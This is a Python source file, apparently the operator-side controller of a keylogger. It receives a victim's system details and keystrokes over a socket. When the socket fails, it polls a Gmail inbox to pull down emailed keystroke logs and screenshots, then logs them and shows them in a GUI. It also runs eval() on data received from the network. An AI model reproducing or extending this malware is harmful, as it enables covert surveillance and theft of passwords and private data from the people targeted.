import threading, os, shutil
import imaplib, email
import pickle
from datetime import datetime
from utils import write_file
from GUI import GUIWindow
from CommunicationHacker import CommunicationHacker
from MenuHandlerHacker import MenuHandlerHacker
from base64 import b64encode, b64decode


class KeyLoggerHacker(threading.Thread):
	def __init__(self, connection, menu, gui, path, logger, config, email_address, email_password):
		super(KeyLoggerHacker, self).__init__()

		self.email_address = email_address
		self.email_password = email_password
		self.config = config
		self.logger = logger
		self.imap_alias = self.config['GMAIL_SERVICE']['IMAP']
		self.temp_path = path

		if isinstance(connection, CommunicationHacker):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'CommunicationHacker\' type!")
		if isinstance(gui, GUIWindow):
			self.gui = gui
		else:
			raise TypeError("\'gui\' parameter should be \'GUIWindow\' type!")
		if isinstance(menu, MenuHandlerHacker):
			self.menu = menu
		else:
			raise TypeError("\'menu\' parameter should be \'MenuHandlerHacker\' type!")


	def get_body(self, msg):
		if msg.is_multipart():
			return get_body(msg.get_payload(0))
		return msg.get_payload(None, True)


	def get_attachments(self, msg):
		for part in msg.walk():
			if part.get_content_maintype() == 'multipart':
				continue
			if part.get('Content-Disposition') is None:
				continue

			filename = part.get_filename()
			if bool(filename):
				with open(os.path.join(self.temp_path, filename), "wb") as handler:
					handler.write(part.get_payload(decode=True))


	def run(self):
		system_info = self.connection.socket_stream.recv()
		system_info = pickle.loads(system_info)
		system_info = b64decode(system_info).decode()
		system_info = eval(system_info)

		path = self.config['DEFAULT']['path']
		filename = self.config['DEFAULT']['filenameSys']

		if not os.path.isdir(path):
			os.mkdir(path=path)

		# writing system information into a file
		with open(os.path.join(path, filename), "w") as handler:
			handler.write("=" * 25 + " System Information " + "=" * 25 + "\n\n")
			handler.write(f"System: {system_info[0]['system']}\n")
			handler.write(f"Device name: {system_info[0]['device_name']}/{system_info[1][0]}\n")
			handler.write(f"User name: {system_info[1][1]}\n")
			handler.write(f"Release: {system_info[0]['release']}\n")
			handler.write(f"Version: {system_info[0]['version']}\n")
			handler.write(f"Architecture: {system_info[0]['architecture']}\n")
			handler.write(f"Processor: {system_info[0]['processor']}\n")
			handler.write(f"IP address: {system_info[1][2]}\n")

		filename = self.config['DEFAULT']['filenameLog']

		while True:
			try:
				# data = [type, time, information]
				# type = <string> image, char, wcpic(webcam picture)
				# time = <string> current time when the key was pressed
				# information = <string> character pressed by the target
				data = self.connection.socket_stream.recv()
				data = pickle.loads(data)
				data = b64decode(data).decode()
				data = eval(data)

				# data process
				if data[0] == "chars":
					write_file(os.path.join(path, filename), data[1:])
					if self.gui.gui_running:
						self.gui.insert_data(data[1:])
				elif data[0] == 'close':
					self.connection.socket_stream.close()
					self.logger.info("Connection closed!\n")
					break

			except:
				self.connection.socket_stream.close()
				self.connection.socket_interact.close()
				self.logger.info("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
				break

		self.menu.stop()

		while True:
			try:
				# establish the connection with gmail service
				with imaplib.IMAP4_SSL(self.imap_alias) as imap_conn:
					imap_conn.login(self.email_address, self.email_password)

					# select from inbox tab the unseen emails
					imap_conn.select('INBOX')
					result, data = imap_conn.search(None, 'UnSeen')
					id_list = data[0].decode().split()

					if len(id_list) > 0:
						result, data = imap_conn.fetch(id_list[-1], '(RFC822)')
						if email.message_from_string(data[0][1].decode())['from'] == self.email_address:
							raw_message = email.message_from_bytes(data[0][1])

							self.logger.info('Downloading email attachments...')
							self.get_attachments(raw_message)
							self.logger.info('Done')

							if os.path.isfile(os.path.join(self.temp_path, filename)):
								with open(os.path.join(self.temp_path, filename), 'r') as reader:
									with open("../logs/log.csv", "a+") as writer:
										self.logger.info('Writing data into file...')
										for line in reader.readlines():
											writer.write(line)
											if self.gui.gui_running:
												self.gui.insert_data(line.split(','))
										self.logger.info('Done')

							if os.path.isfile(os.path.join(self.temp_path, "screenshot.png")):
								date_time = datetime.now().strftime("%d_%H_%M_%S")
								self.logger.info('Moving the screenshot into current folder...')
								shutil.move(os.path.join(self.temp_path, "screenshot.png"), f"./screenshot_{date_time}.png")
								self.logger.info('Done\n')
			except:
				self.logger.info("Something went wrong while processing the email!")
				break